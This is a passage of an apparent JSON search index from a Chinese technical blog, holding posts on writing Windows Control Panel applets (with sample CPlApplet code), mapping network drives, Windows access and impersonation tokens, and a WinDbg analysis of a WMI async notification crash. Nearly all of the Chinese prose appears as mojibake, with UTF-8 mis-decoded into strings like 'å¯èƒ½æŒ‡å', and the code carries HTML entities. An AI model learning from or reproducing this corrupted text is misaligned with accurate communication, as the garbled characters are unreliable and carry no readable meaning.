å¯èƒ½æŒ‡å‘ä¸€ä¸ªåŒ…å«å¤šä¸ªæ§åˆ¶é¢æ¿é¡¹çš„æ–‡ä»¶å¤¹ï¼Œè¿™äº›é¡¹åœ¨æ¡Œé¢ä¸Šä»¥å•ä¸ªå›¾æ ‡çš„å½¢å¼æ˜¾ç¤ºã€‚ è¦è·å–ç‰¹å®š GUID ä¸å…¶å¯¹åº”çš„é¡¹ç›®æˆ–æ–‡ä»¶å¤¹ä¹‹é—´çš„ç¡®åˆ‡å…³ç³»ï¼Œä½ éœ€è¦æŸ¥çœ‹æ³¨å†Œè¡¨ä¸­çš„å…·ä½“æ¡ç›®ï¼Œå¹¶å¯èƒ½éœ€è¦å‚è€ƒ Windows å†…éƒ¨æ–‡æ¡£æˆ–åœ¨çº¿èµ„æºã€‚ä½†æ˜¯ï¼Œé€šå¸¸ä¸å»ºè®®ç›´æ¥ä¿®æ”¹è¿™äº›æ¡ç›®ï¼Œé™¤éä½ ç¡®åˆ‡çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¹¶ä¸”æœ‰å¤‡ä»½æˆ–æ¢å¤è®¡åˆ’ï¼Œä»¥é˜²å‡ºç°é—®é¢˜ã€‚ 0x03 æ–°å»ºä¸€ä¸ªæ§åˆ¶é¢æ¿é¡¹ç›® é€šå¸¸å¦‚æœéœ€è¦æ–°å»ºä¸€ä¸ªæ§åˆ¶é¢æ¿é¡¹ç›®ï¼Œåˆ™éœ€è¦åœ¨ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cputs è·¯å¾„ä¸‹æ·»åŠ ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ï¼Œå¹¶ä¸”æ³¨å†Œè¡¨é¡¹éœ€è¦æŒ‡å‘ cpl æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 0x04 ç¼–å†™ä¸€ä¸ªæ§åˆ¶é¢æ¿ç¨‹åº å‚è€ƒé¡¹ç›®ï¼šgtrubach/MyCPLApplet: Example of creating control panel applets in Windows. cpl æ–‡ä»¶ç±»ä¼¼ dll æ–‡ä»¶ï¼Œå…¥å£å‡½æ•°ä¸åŒï¼ŒåŠ è½½é€»è¾‘åŸºæœ¬ä¸€è‡´ï¼š è‹¥å£å‡½æ•°å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546extern &quot;C&quot; LONG APIENTRY CPlApplet( HWND hwndCPL, // handle of Control Panel window UINT uMsg, // message LONG_PTR lParam1, // first message parameter LONG_PTR lParam2 // second message parameter)&#123; AFX_MANAGE_STATE(AfxGetStaticModuleState()); LPCPLINFO lpCPlInfo; LONG retCode = 0; switch (uMsg) &#123; case CPL_INIT: // first message, sent once return TRUE; case CPL_GETCOUNT: // second message, sent once return 1L; // (LONG)NUM_APPLETS; case CPL_INQUIRE: // third message, sent once per app lpCPlInfo = (LPCPLINFO)lParam2; lpCPlInfo-&gt;idIcon = IDI_SAMPLE_CPL; lpCPlInfo-&gt;idName = IDS_SAMPLE_CPL_NAME; lpCPlInfo-&gt;idInfo = IDS_SAMPLE_CPL_DESCRIPTION; lpCPlInfo-&gt;lData = 0L; break; case CPL_DBLCLK: // application icon double-clicked &#123; CWnd wndCPL; BOOL b = wndCPL.Attach(hwndCPL); CMyPropertySheet propSheet(IDS_SAMPLE_CPL_NAME, &amp;wndCPL); // This is where you would retrieve information from the property // sheet if propSheet.DoModal() returned IDOK. We aren&#x27;t doing // anything for simplicity. propSheet.DoModal(); wndCPL.Detach(); &#125; break; &#125; return retCode;&#125;","tags":[{"name":"Windows/æ³¨å†Œè¡¨","slug":"Windows-æ³¨å†Œè¡¨","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"name":"Windows/Registry","slug":"Windows-Registry","permalink":"https://hodlyounger.github.io/tags/Windows-Registry/"},{"name":"Windows/æ§åˆ¶é¢æ¿","slug":"Windows-æ§åˆ¶é¢æ¿","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ³¨å†Œè¡¨","slug":"A-OS/Windows/æ³¨å†Œè¡¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%B3%A8%E5%86%8C%E8%A1%A8/"}]},{"title":"ã€ç¯å¢ƒæ­å»ºã€‘æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨","date":"2024-02-18T16:00:00.000Z","path":"A_OS/Windows/ç¯å¢ƒæ­å»º/ã€ç¯å¢ƒæ­å»ºã€‘æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨/","text":"æ¦‚è¿°ï¼šwin10 æ­å»ºç½‘ç»œæ˜ å°„é©±åŠ¨å™¨ ç½‘ç»œé©±åŠ¨å™¨ï¼šå³æŠŠç½‘ç»œä¸­çš„ç£ç›˜æ˜ å°„åˆ°æœ¬åœ°ï¼Œä»¥ä¾¿äºç½‘ç»œå†…çš„æœºå™¨å…±äº«ã€‚ åœºæ™¯ï¼šè€ƒè™‘æœ‰è¿™ä¹ˆä¸ªåœºæ™¯ï¼šä½ çš„ä¸»æœºå­˜å‚¨å¿«æ²¡äº†ï¼Œä½ ä¹Ÿä¸æƒ³è‡ªå·±è£…å—ç¡¬ç›˜ï¼Œæ­£å¥½è¿˜æœ‰å°é—²ç½®ç”µè„‘ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘æŠŠé‚£å°é—²ç½®ç”µè„‘çš„å­˜å‚¨æ˜ å°„åˆ°ä½ çš„ä¸»æœºä¸Šï¼Œä»è€Œå®ç°æ‰©å®¹ã€‚æ‰€ä»¥æœ¬æ•™ç¨‹æƒ³å®ç°çš„å°±æ˜¯è¿™ä¹ˆä¸ªç›®çš„ã€‚ ç°æœ‰ æœºå™¨A å’Œ æœºå™¨Bï¼Œæƒ³åœ¨æœºå™¨Aä¸Šé€šè¿‡ç½‘ç»œæ˜ å°„çš„æ–¹å¼æ‰©å±•æœºå™¨Açš„å­˜å‚¨ (å…±äº«æœºå™¨Bçš„å­˜å‚¨)ï¼Œæ“ä½œæ–¹æ³•å¦‚ä¸‹ã€‚ 0x01 æœºå™¨B æ·»åŠ å…±äº«æ–‡ä»¶å¤¹ åˆ›å»ºå…±äº«æ–‡ä»¶å¤¹ å¤åˆ¶å…±äº«è·¯å¾„ 0x02 æœºå™¨A æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ 0x03 ç›¸å…³è¡¥å…… å¦‚æœè¦è·å–ç›¸å…³ä¿¡æ¯ï¼Œå‚è€ƒå¾®è½¯æ–‡æ¡£ Windows ç½‘ç»œ (WNet) - Win32 apps | Microsoft Learn","tags":[{"name":"Windows/é©±åŠ¨å™¨","slug":"Windows-é©±åŠ¨å™¨","permalink":"https://hodlyounger.github.io/tags/Windows-%E9%A9%B1%E5%8A%A8%E5%99%A8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"ã€æƒé™ä¸ä¼šè¯ã€‘Windows ä»¤ç‰Œ","date":"2024-02-06T16:00:00.000Z","path":"A_OS/Windows/æƒé™ä¸ä¼šè¯/ã€æƒé™ä¸ä¼šè¯ã€‘Windows ä»¤ç‰Œ/","text":"æ¦‚è¿°ï¼šWinodws ä»¤ç‰Œè¯¦è§£ï¼Œå…³äº windows åˆå§‹ä»¤ç‰Œã€ä¸»ä»¤ç‰Œï¼Œæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå…³è”ä»¤ç‰Œç­‰æ¦‚å¿µçš„è¯´æ˜ã€‚ å·¥å…·æ¨èï¼šdiversenok/TokenUniverse: An advanced tool for working with access tokens and Windows security policy. 0x01 åˆå§‹ä»¤ç‰Œ åˆå§‹ä»¤ç‰Œä¹Ÿç§°è®¿é—®ä»¤ç‰Œï¼Œæ˜¯æè¿°è¿›ç¨‹æˆ–çº¿ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡çš„å¯¹è±¡ã€‚ä»¤ç‰Œä¸­çš„ä¿¡æ¯åŒ…æ‹¬ä¸è¿›ç¨‹æˆ–çº¿ç¨‹å…³è”çš„ç”¨æˆ·å¸æˆ·çš„æ ‡è¯†å’Œç‰¹æƒä¿¡æ¯ã€‚ å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿé€šè¿‡å°†ç”¨æˆ·å¯†ç ä¸å®‰å…¨æ•°æ®åº“ï¼ˆå¦‚åŸŸè®¤è¯ä¸­çš„NTDSæˆ–æœ¬åœ°è®¤è¯ä¸­çš„SAMæ–‡ä»¶ï¼‰ä¸­å­˜å‚¨çš„ä¿¡æ¯è¿›è¡Œæ¯”è¾ƒæ¥éªŒè¯ç”¨æˆ·å¯†ç ã€‚ å¦‚æœå¯†ç ç»è¿‡éªŒè¯ï¼Œåˆ™ç³»ç»Ÿå°†ç”Ÿæˆè®¿é—®ä»¤ç‰Œã€‚ä»£è¡¨è¯¥ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰æ­¤è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚ï¼ˆé€šå¸¸æˆ‘ä»¬åœ¨è¾“å…¥å¯†ç ç™»é™†è¿›å…¥Windowsç•Œé¢æ—¶å°±æ˜¯ä¸€ä¸ªç”Ÿæˆè®¿é—®ä»¤ç‰Œçš„è¿‡ç¨‹ï¼‰å½“çº¿ç¨‹ä¸å®‰å…¨å¯¹è±¡è¿›è¡Œäº¤äº’æˆ–å°è¯•æ‰§è¡Œéœ€è¦ç‰¹æƒçš„ç³»ç»Ÿä»»åŠ¡æ—¶ï¼Œç³»ç»Ÿä½¿ç”¨è®¿é—®ä»¤ç‰Œæ¥æ ‡è¯†ç”¨æˆ·ã€‚ è®¿é—®ä»¤ç‰ŒåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š flowchart LR A[è®¿é—®ä»¤ç‰Œ] --> ç”¨æˆ·æ‰€åœ¨ç»„SID A --> C[ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨æè¿°ç¬¦ SID] A --> D[\"æ ‡è¯†å½“å‰ç™»å½•ä¼šè¯(logon session)çš„ç™»å½•SID\"] A --> E[\"ç‰¹æƒï¼ˆprivilegeï¼‰:ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‹¥æœ‰çš„ç‰¹æƒåˆ—è¡¨\"] A --> F[\"å…¶ä»–æ•°æ®\"] Access Tokençš„ç»„æˆ ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID) ç”¨æˆ·æ‰€å±çš„ç»„çš„SID ç”¨äºæ ‡è¯†å½“å‰ç™»é™†ä¼šè¯çš„ç™»é™†SID ç”¨æˆ·æˆ–ç”¨æˆ·ç»„æ‰€æ‹¥æœ‰çš„æƒé™åˆ—è¡¨ æ‰€æœ‰è€…SID ä¸»è¦ç»„çš„SID è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®ä»¤ç‰Œçš„æ¥æº ä»¤ç‰Œæ˜¯ä¸»è¦ä»¤ç‰Œè¿˜æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œ é™åˆ¶SIDçš„å¯é€‰åˆ—è¡¨ ç›®å‰çš„æ¨¡æ‹Ÿç­‰çº§ å…¶ä»–ç»Ÿè®¡çš„æ•°æ® åˆå§‹ä»¤ç‰Œçš„åˆ›å»ºè¿‡ç¨‹ Windows Access Token åˆ›å»ºè¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒä¸‹ ã€Šæ·±å…¥è§£æ Windows æ“ä½œç³»ç»Ÿ ç¬¬6ç‰ˆã€‹ç¬¬å…­ç« ç¬¬8èŠ‚ç›¸å…³æè¿° ç™»å½•ä¸»è¦åˆ†ä¸ºä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯éäº¤äº’å¼çš„ï¼Œä¸€ç§æ˜¯äº¤äº’å¼çš„ éäº¤äº’å¼çš„ï¼Œç”¨æˆ·åœ¨è¾“å…¥ç”¨æˆ·åå’Œå¯†ç åï¼Œç”± WinLogon è°ƒç”¨ LSASS(Local Security Authority Subsystem Service) ä¸­çš„ç›¸å…³å‡½æ•°ï¼ˆLasLogonUserï¼‰ä¼ é€’ç™»å½•ä¿¡æ¯ç»™è®¤è¯åŒ… å¯¹äºäº¤äº’å¼ç™»å½•ï¼ŒWindowsä½¿ç”¨ä¸¤ä¸ªæ ‡å‡†çš„è®¤è¯åŒ…âˆ¶ Kerberos å’Œ MSV1_0 è®¤è¯é€šè¿‡åï¼ŒLSASS åœ¨æœ¬åœ°ç­–ç•¥ä¸­æŸ¥æ‰¾è¯¥ç”¨æˆ·æœ‰å“ªäº›å…è®¸çš„è®¿é—®ï¼ŒåŒ…æ‹¬äº¤äº’æ–¹å¼ã€ç½‘ç»œæ–¹å¼ã€æ‰¹æ–¹å¼æˆ–æœåŠ¡æ–¹å¼ï¼Œå¦‚æœå½“å‰æ‰€è¯·æ±‚çš„ç™»å½•ä¸ç¬¦åˆæ•°æ®åº“ä¸­å…è®¸ çš„è®¿é—®æ–¹å¼ï¼Œåˆ™æ­¤æ¬¡ç™»å½•è¢«ç»ˆæ­¢ã€‚å¦‚æœå½“å‰è¯·æ±‚çš„ç™»å½•æ˜¯å…è®¸çš„ï¼Œåˆ™ LSASS ä¼šåŠ å…¥ä¸€äº›é¢å¤–çš„å®‰å…¨ID(SID)ï¼Œç„¶ååœ¨ç­–ç•¥æ•°æ®åº“ä¸­æŸ¥æ‰¾ç”¨æˆ·æ‰€æœ‰SIDçš„å·²ç»è¢«æˆäºˆçš„æƒé™ï¼Œå¹¶ä¸”æŠŠè¿™äº›ç‰¹æƒåŠ å…¥åˆ°ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œä¸­ã€‚ å½“ LSASS å·²ç»ç§¯ç´¯äº†æ‰€æœ‰è¿™äº›å¿…è¦çš„ä¿¡æ¯æ—¶ï¼Œä¼šè°ƒç”¨æ‰§è¡Œä½“æ¥åˆ›å»º è®¿é—®ä»¤ç‰Œã€‚æ‰§è¡Œä½“ ä¸ºäº¤äº’å¼ç™»å½•æˆ–æœåŠ¡æ–¹å¼ç™»å½•åˆ›å»ºä¸€ä¸ªä¸»è®¿é—®ä»¤ç‰Œ ä¸ºç½‘ç»œæ–¹å¼ç™»å½•åˆ›å»ºä¸€ä¸ªæ¨¡ä»¿ä»¤ç‰Œ åˆ›å»ºæˆåŠŸåï¼Œ LSASS å¤åˆ¶æ­¤ä»¤ç‰Œï¼Œåˆ›å»ºä¸€ä¸ªå¯å°†æ­¤ä»¤ç‰Œä¼ é€’ç»™ WinLogon çš„å¥æŸ„ï¼Œç„¶åå…³é—­è‡ªèº«å¥æŸ„ã€‚ ç»¼ä¸Šå°±æ˜¯ Windows åˆå§‹ä»¤ç‰Œçš„åˆ›å»ºè¿‡ç¨‹ã€‚ ä¹‹åï¼Œåˆ™æ˜¯é€šè¿‡ WinLogon ä¸­çš„ä»¤ç‰Œåˆ›å»ºè¿›ç¨‹ã€çº¿ç¨‹ã€‚ è¿›ç¨‹æŒæœ‰ä¸€ä¸ªä¸»ä»¤ç‰Œï¼Œçº¿ç¨‹åˆ™ä½¿ç”¨çš„æ¨¡æ‹Ÿä»¤ç‰Œã€‚ 0x02 æˆæƒä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œ è®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿç”¨æè¿°è¿›ç¨‹æˆ–è€…çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„ä¸€ä¸ªå¯¹è±¡ã€‚ Windowsä¸‹æœ‰ä¸¤ç§ç±»å‹çš„Tokenä»¤ç‰Œï¼šæˆæƒä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œã€‚ æˆæƒä»¤ç‰Œï¼ˆDelegation Tokenï¼‰ ä¹Ÿå«ä¸»ä»¤ç‰Œï¼Œæ˜¯ç”± Windows å†…æ ¸åˆ›å»ºå¹¶åˆ†é…ç»™è¿›ç¨‹çš„é»˜è®¤è®¿é—®ä»¤ç‰Œï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªä¸»ä»¤ç‰Œï¼Œå®ƒæè¿°äº†ä¸å½“å‰è¿›ç¨‹ç›¸å…³çš„ç”¨æˆ·å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚ç”¨äºäº¤äº’å¼ç™»å½•ï¼ˆå¦‚rdpç™»å½•è®¿é—®ï¼‰ã€‚ æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆImpersonation Tokenï¼‰ æ‰€åœ¨è¿›ç¨‹çš„ä¸»ä»¤ç‰Œä¼šè‡ªåŠ¨é™„åŠ åˆ°å½“å‰çš„çº¿ç¨‹ä¸Šï¼Œä½œä¸ºçº¿ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚è€Œçº¿ç¨‹å¯ä»¥è¿è¡Œåœ¨å¦ä¸€ä¸ªéä¸»ä»¤ç‰Œçš„è®¿é—®ä»¤ç‰Œä¸‹æ‰§è¡Œï¼Œè€Œè¿™ä¸ªä»¤ç‰Œè¢«ç§°ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚ç”¨äºéäº¤äº’å¼çš„ä¼šè¯ï¼ˆåˆ©ç”¨WMIè¿›è¡Œè¿œç¨‹è®¿é—®ï¼‰ã€‚ æ³¨ï¼šä¸¤ç§ä»¤ç‰Œä¼šåœ¨ç³»ç»Ÿé‡å¯æˆ–è€…å…³æœºåæ‰ä¼šå…¨éƒ¨æ¸…é™¤ï¼Œä¸ç„¶å°†ä¼šä¸€ç›´åœ¨å†…å­˜ä¸­å­˜ç•™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæœºå™¨ä¸å…³æœºæˆ–è€…é‡å¯çš„è¯ï¼Œå°±ä¼šå­˜åœ¨æ•£è½çš„ä»¤ç‰Œã€‚åœ¨ç³»ç»Ÿæ³¨é”€åï¼Œå…·æœ‰æˆæƒä»¤ç‰Œçš„ç”¨æˆ·ä¼šå˜ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œ Impersonation Tokenï¼Œä½†ä¾ç„¶æœ‰æ•ˆã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“å‰ç”¨æˆ·åªèƒ½çœ‹åˆ°å½“å‰ç”¨æˆ·è‡ªå·±å’Œæ¯”è‡ªå·±æƒé™ä½çš„æ‰€æœ‰è®¿é—®ä»¤ç‰Œã€‚ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªä¸»è¦ä»¤ç‰Œï¼Œç”¨äºæè¿°ä¸è¯¥è¿›ç¨‹å…³è”çš„ç”¨æˆ·å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“è¿›ç¨‹çš„çº¿ç¨‹ä¸å®‰å…¨å¯¹è±¡è¿›è¡Œäº¤äº’æ—¶ï¼Œç³»ç»Ÿä½¿ç”¨ä¸»ä»¤ç‰Œã€‚ æ­¤å¤–ï¼Œçº¿ç¨‹å¯ä»¥æ¨¡æ‹Ÿå®¢æˆ·ç«¯å¸æˆ·ã€‚æ¨¡æ‹Ÿå…è®¸çº¿ç¨‹ä½¿ç”¨å®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸å®‰å…¨å¯¹è±¡è¿›è¡Œäº¤äº’ã€‚æ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„çº¿ç¨‹åŒæ—¶å…·æœ‰ä¸»ä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œã€‚ï¼ˆå‡ºç°è¿™ç§æƒ…å†µæ˜¯å› ä¸ºæœåŠ¡æ“ä½œæ˜¯åœ¨å¯„å®¿è¿›ç¨‹ä¸­æ‰§è¡Œï¼Œåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡æ“ä½œæ˜¯å¦å…·æœ‰è¶³å¤Ÿçš„æƒé™è®¿é—®æŸä¸ªèµ„æºï¼ˆæ¯”å¦‚æ–‡ä»¶ï¼‰å–å†³äºæ‰§è¡Œå¯„å®¿è¿›ç¨‹Windowså¸å·çš„æƒé™è®¾ç½®ï¼Œè€Œä¸ä½œä¸ºå®¢æˆ·ç«¯çš„Windowså¸å·æ— å…³ã€‚åœ¨æœ‰å¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›æœåŠ¡æ“ä½œæ‰§è¡Œåœ¨åŸºäºå®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»¥è§£å†³æ‰§è¡ŒæœåŠ¡è¿›è¡Œçš„å¸å·æƒé™ä¸è¶³çš„é—®é¢˜ã€‚ç®€å•æ¥è¯´å°±æ˜¯æˆ‘ä»¬å¸Œæœ›ä¸åŒå®¢æˆ·ç«¯æ¥è®¿é—®æœåŠ¡æ—¶ï¼ŒæœåŠ¡å¯ä»¥æ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„èº«ä»½å»è®¿é—®æœåŠ¡ï¼Œè€Œä¸æ˜¯ç”¨è‡ªå·±çš„ä¸»è¿›ç¨‹Tokenèº«ä»½å»è®¿é—®ã€‚ï¼‰ ä¸ºä»€ä¹ˆä½¿ç”¨æ¨¡æ‹Ÿä»¤ç‰Œ ä½¿ç”¨æ¨¡æ‹Ÿä»¤ç‰Œæœ‰åŠ©äºå®ç°æƒé™åˆ†ç¦»ã€‚å³ä½¿è¿›ç¨‹æœ¬èº«å¯èƒ½æ‹¥æœ‰è¾ƒé«˜çš„æƒé™ï¼Œä½†é€šè¿‡æ¨¡æ‹Ÿä»¤ç‰Œï¼Œå¯ä»¥ä»¥è¾ƒä½æƒé™çš„ç”¨æˆ·èº«ä»½æ‰§è¡Œä¸€äº›æ•æ„Ÿæ“ä½œï¼Œä»è€Œå‡å°æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚ é™¤æƒé™åˆ†ç¦»ä»¥å¤–ï¼ŒWindows ä»¤ç‰Œæœºåˆ¶å¸¦æ¥äº†å•ç‚¹ç™»å½•å’Œè®¿é—®æ§åˆ¶ç­‰ä¼—å¤šå¥½å¤„ã€‚ ç®¡ç†å‘˜ç™»å½•æ—¶ï¼Œå°†ä¸ºç”¨æˆ·åˆ›å»ºä¸¤ä¸ªå•ç‹¬çš„è®¿é—®ä»¤ç‰Œï¼šæ ‡å‡†ç”¨æˆ·è®¿é—®ä»¤ç‰Œå’Œç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œã€‚æ ‡å‡†ç”¨æˆ·è®¿é—®ä»¤ç‰ŒåŒ…å«ä¸ç®¡ç†å‘˜è®¿é—®ä»¤ç‰Œç›¸åŒçš„ç‰¹å®šäºç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†åˆ é™¤äº†ç®¡ç†å‘˜çš„ Windows ç‰¹æƒå’Œ SIDã€‚æ­¤å¤–ï¼Œæ‰§è¡Œ explorer.exe ä¹Ÿé€šè¿‡æ ‡å‡†ä»¤ç‰Œæ¥æ˜¾ç¤ºæ¡Œé¢ï¼Œè€Œ explorer.exe æ˜¯çˆ¶è¿›ç¨‹ï¼Œæ‰€æœ‰å…¶ä»–ç”¨æˆ·å¯åŠ¨çš„è¿›ç¨‹éƒ½ä»ä¸­ç»§æ‰¿å…¶è®¿é—®ä»¤ç‰Œã€‚å› æ­¤ï¼Œé™¤éç”¨æˆ·æ‰¹å‡†åº”ç”¨ç¨‹åºä½¿ç”¨å®Œæ•´çš„ç®¡ç†è®¿é—®ä»¤ç‰Œï¼Œå¦åˆ™æ‰€æœ‰åº”ç”¨ç¨‹åºéƒ½ä¼šä»¥æ ‡å‡†ç”¨æˆ·èº«ä»½è¿è¡Œã€‚ 0x03 å…³äºä»¤ç‰Œçš„è¡¥å…… Token åœ¨ç³»ç»Ÿé‡å¯åä¼šæ¸…é™¤","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"ä»¤ç‰Œ","slug":"ä»¤ç‰Œ","permalink":"https://hodlyounger.github.io/tags/%E4%BB%A4%E7%89%8C/"},{"name":"token","slug":"token","permalink":"https://hodlyounger.github.io/tags/token/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æƒé™ä¸ä¼šè¯","slug":"A-OS/Windows/æƒé™ä¸ä¼šè¯","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%9D%83%E9%99%90%E4%B8%8E%E4%BC%9A%E8%AF%9D/"}]},{"title":"ã€COMã€‘å¼‚æ­¥é€šçŸ¥ ExecNotificationQueryAsync çš„ä½¿ç”¨é—®é¢˜","date":"2024-02-06T08:37:40.593Z","path":"A_OS/Windows/COM/ã€COMã€‘å¼‚æ­¥é€šçŸ¥çš„ä½¿ç”¨é—®é¢˜/","text":"æ¦‚è¿°ï¼šå¼‚æ­¥é€šçŸ¥ IWbemServices::ExecNotificationQueryAsync çš„ä½¿ç”¨é—®é¢˜ã€‚è°ƒç”¨ CancelAsyncCall ä¹‹åå¯¼è‡´ç¨‹åºå´©æºƒã€‚ ä»£ç å‚è€ƒå¾®è½¯å®˜æ–¹ç¤ºä¾‹ï¼šç¤ºä¾‹ï¼šé€šè¿‡ WMI æ¥æ”¶äº‹ä»¶é€šçŸ¥ - Win32 apps | Microsoft Learn 0x01 å¤ç°åœºæ™¯ ç¯å¢ƒï¼šwindows server 2008 å‚è€ƒå¾®è½¯å®˜æ–¹ä»£ç å®ç°ä¸€ä¸ªè¿›ç¨‹ï¼Œä½¿ç”¨ windbg åŠ è½½è¿›ç¨‹ï¼Œç„¶åç­‰å¾…è¿›ç¨‹ç»“æŸï¼Œå°±èƒ½çœ‹åˆ° windbg æŠ¥é”™ 0xC0000005ã€‚ 0x02 dmpåˆ†æ æŠ¥é”™è¯¦æƒ… ï¼ˆè°ƒç”¨ CancelAsyncCall çš„è¿›ç¨‹ï¼‰ä¸»è¦é—®é¢˜è¿˜æ˜¯è®¿é—®äº†ç©ºæŒ‡é’ˆå¯¼è‡´çš„ï¼Œå¹¶ä¸”æ˜¯ ecxã€‚æ˜¯ç±»æˆå‘˜å‡½æ•°è°ƒç”¨æ—¶å‡ºç°å¼‚å¸¸ã€‚this æŒ‡é’ˆä¸ºç©ºã€‚ å †æ ˆ ç¡®å®šæ˜¯ RPC è°ƒç”¨ã€‚ä¸‹ä¸€æ­¥æŸ¥è¯¢ä¸‹ RPC è°ƒç”¨æ–¹ã€‚ ole32!GetChannelCallMgr å‡½æ•°åŸå‹ï¼š 12HRESULT GetChannelCallMgr(RPCOLEMESSAGE *pMsg, IUnknown * pStub, IUnknown *pServer, CRpcChannelBuffer::CServerCallMgr **ppStubBuffer) ç›´æ¥çœ‹ç¬¬ä¸€ä¸ªå‚æ•° pMsg ã€‚ æŸ¥çœ‹ä¸‹è°ƒç”¨æ–¹ æˆå‘˜å˜é‡ reserverd1 ä¿å­˜äº†RPCç›¸å…³ä¿¡æ¯ã€‚ å…ˆ dds å† dt æŸ¥çœ‹å…¶å†…å®¹ã€‚ CAsyncCall çš„æˆå‘˜å¯ä»¥æŸ¥çœ‹ Windows-Server-2003/com/ole32/com/dcomrem/call.hxx at 5c6fe3db626b63a384230a1aa6b92ac416b0765f Â· selfrender/Windows-Server-2003 ä¸­ç›¸å…³æºç ã€‚ æˆå‘˜å˜é‡ _hRPC æ¥è‡ªäºå…¶ç»§æ‰¿çš„çˆ¶ç±» CMessageCall 1293 handle_t _hRpc; // Call handle (not binding handle). _hRpc è®°å½•äº†è°ƒç”¨æ–¹çš„å¥æŸ„ã€‚æŸ¥çœ‹ 0x0479ba28 å†…å­˜ï¼Œåœ¨å…¶é™„è¿‘æ‰¾åˆ°äº†è°ƒç”¨æ–¹çš„ PID å’Œ TIDã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š çœ‹ä¸‹ PID å¯¹åº”çš„è¿›ç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š unsecapp ä¹Ÿå°±æ˜¯æˆ‘ä»¬æ³¨å†Œçš„å¼‚æ­¥é€šçŸ¥çš„é€šçŸ¥æ–¹ã€‚ 0x03 é—®é¢˜åˆ†æ åŸºæœ¬åˆ†æå®Œ dmp æ–‡ä»¶ä¹‹åï¼Œå¯ä»¥ç¡®å®šæ˜¯æˆ‘ä»¬æ³¨å†Œçš„å¼‚æ­¥é€šçŸ¥åœ¨ç¨‹åºç»“æŸæ—¶è¢«è°ƒç”¨äº†ï¼Œå¯¼è‡´ unsecapp 